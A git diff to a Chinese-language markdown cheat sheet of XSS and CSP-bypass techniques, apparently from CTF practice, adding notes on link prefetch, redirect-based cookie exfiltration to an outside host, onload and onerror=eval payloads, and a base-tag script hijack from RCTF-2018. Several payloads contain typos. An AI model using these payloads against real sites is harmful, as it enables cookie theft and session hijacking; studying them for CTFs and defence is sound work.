@@ -112,9 +112,11 @@ header(" Content-Security-Policy: default-src 'self '; script-src http://localho
 ```php
 header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
 ```
-`unsage-inline`指頁面中直接添加的`<script>`可以被執行，再來便是繞過domain的限制：  
+`unsafe-inline`指頁面中直接添加的`<script>`可以被執行，再來便是繞過domain的限制：  
   1. 用js製造link prefetch  
      [什麼是prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
+     prefetch下面還有`DNS-prefetch`,`subresource`,`prefetch`,`preconnect`,`prerender`幾個概念  
+     不是所有source都能預加載的，e.g. ajax，開啟developer tool的頁面    
      ```js
      // 只有chrome可用  
      var x = document.createElement("link");
@@ -123,6 +125,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
      document.head.appendChild(x);
      ```
   2. 跳轉 && 跨域  
+     跳轉的部分注意跳板也受host的限制，src路徑則跳脫限制  
      ```js
      <script>location.href=http://lorexxar.cn?a+document.cookie</script>
      <script>windows.open(http://lorexxar.cn?a=+document.cooke)</script>
@@ -173,6 +176,7 @@ js中會用正規表達式來過濾危險字符
 [Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
 
 # 攻擊手勢  
+這裡整理一些攻擊手勢以及比賽中碰到的思路  
 * 不同的`<tag>`做利用  
 ```js
 // script
@@ -187,8 +191,8 @@ js中會用正規表達式來過濾危險字符
 <svg/onload=alert(1)>
 
 // body
-<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29’;>   
 // 這種payload也可以繞過括號過濾
+<body/onload=javascript:window.onerror=eval;throw=alert\x281\x29’;>  
 ```
 * DOM based XSS  
 ```js
@@ -207,7 +211,19 @@ js中會用正規表達式來過濾危險字符
 ```
 值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
 [XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
-* Vue.js
+* Vue.js  
+with SSTI  
+* `<base>`覆蓋相對路徑下的js  
+這是我在RCTF-2018中碰到的比賽思路，CSP沒有限制`base-uri`因此可以用`<base>`繞過，而頁面中剛好又有用相對路徑引用外部的js檔，我們便可以自己偽造一個無視CSP的js  
+exploit:  
+頁面中被插入`<base href="http://controlled_domain/">`  
+>  
+被引入的`/assets/jquery.min.js`全都變成`http://controlled_domain/assets/jquery.min.js`  
+>  
+`controlled_domain/assets/jquery.min.js`我們可以在裡面插入`location.href=url;`  
+>  
+當我們訪問最前面被插入`<base>`的頁面時就會被導到這個`url`囉！  
+細節詳見：[rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)
 
 
 # 彈窗手勢
@@ -223,7 +239,7 @@ onkeypress=function(){
 }
 ```
 以上效果可瀏覽 https://vulnerabledoma.in/popunder/keyevent.html  
-[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)
+[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)  
 
 # Cheatsheet
 ```php
